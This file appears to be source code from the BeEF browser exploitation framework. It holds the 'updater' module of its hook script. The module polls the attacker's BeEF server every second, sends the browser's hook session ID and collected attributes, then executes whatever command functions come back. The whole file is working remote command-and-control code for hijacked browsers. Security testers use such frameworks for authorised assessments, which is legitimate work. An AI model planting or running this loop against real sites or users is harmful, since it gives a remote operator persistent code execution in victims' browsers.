//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
/*!
 * @Literal object: beef.updater
 *
 * Object in charge of getting new commands from the BeEF framework and execute them.
 */
beef.updater = {
	
	// Low timeouts combined with the way the framework sends commamd modules result 
	// in instructions being sent repeatedly or complex code. 
	// If you suffer from ADHD, you can decrease this setting.
	timeout: 1000,
	
	// A lock.
	lock: false,
	
	// An object containing all values to be registered and sent by the updater.
	objects: new Object(),
	
	/*
	 * Registers an object to always send when requesting new commands to the framework.
	 * @param: {String} the name of the object.
	 * @param: {String} the value of that object.
	 * 
	 * @example: beef.updater.regObject('java_enabled', 'true');
	 */
	regObject: function(key, value) {
		this.objects[key] = escape(value);
	},
	
	// Checks for new commands from the framework and runs them.
	check: function() {
		if(this.lock == false) {
			if (beef.logger.running) {
				beef.logger.queue();
			}
			beef.net.flush();
			if(beef.commands.length > 0) {
				this.execute_commands();
			}

            else {
				this.get_commands();    /*Polling*/
			}
		}

      //if ( typeof beef.websocket === "undefined")
		setTimeout("beef.updater.check();", beef.updater.timeout);
	},
	
	// Gets new commands from the framework.
	get_commands: function(http_response) {
		try {
			this.lock = true;
            beef.net.request('http', 'GET', beef.net.host, beef.net.port, beef.net.hook, null, 'BEEFHOOK='+beef.session.get_hook_session_id(), 1, 'script', function(response) {
                if (response.body != null && response.body.length > 0)
                    beef.updater.execute_commands();
            });
		} catch(e) {
			this.lock = false;
			return;
		}
		this.lock = false;
	},
	
	// Executes the received commands if any.
	execute_commands: function() {
		if(beef.commands.length == 0) return;
		
		this.lock = true;
		/*here execute the command */

		while(beef.commands.length > 0) {
			command = beef.commands.pop();
			try {
				command();
			} catch(e) {
				console.error('execute_commands - command failed to execute: ' + e.message);
			}
		}
		
		this.lock = false;
	}
}

beef.regCmp('beef.updater');
